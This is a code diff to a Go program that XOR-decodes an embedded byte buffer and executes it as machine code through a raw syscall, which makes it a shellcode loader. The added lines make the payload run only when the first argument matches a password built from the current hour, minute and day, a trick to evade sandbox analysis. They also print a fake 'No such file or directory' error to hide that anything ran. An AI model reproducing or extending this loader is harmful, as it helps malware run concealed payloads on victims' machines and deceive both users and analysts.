@@ -2,7 +2,11 @@ package main
 
 import (
 	_ "embed"
+	"fmt"
+	"os"
+	"strconv"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -14,8 +18,20 @@ var (
 )
 
 func main() {
+	runflag := false
+	t := time.Now()
+	hour := t.Hour()
+	minute := t.Minute()
+	day := t.Day()
+	pass := strconv.Itoa(hour) + strconv.Itoa(minute) + strconv.Itoa(day)
+	if os.Args[1] == pass {
+		runflag = true
+	}
 	for index, padByte := range pad1 {
 		pad2[index] = pad2[index] ^ padByte
 	}
-	syscall.Syscall(uintptr(unsafe.Pointer(&pad2[0])), 0, 0, 0, 0)
+	if runflag {
+		syscall.Syscall(uintptr(unsafe.Pointer(&pad2[0])), 0, 0, 0, 0)
+	}
+	fmt.Printf("No such file or directory")
 }
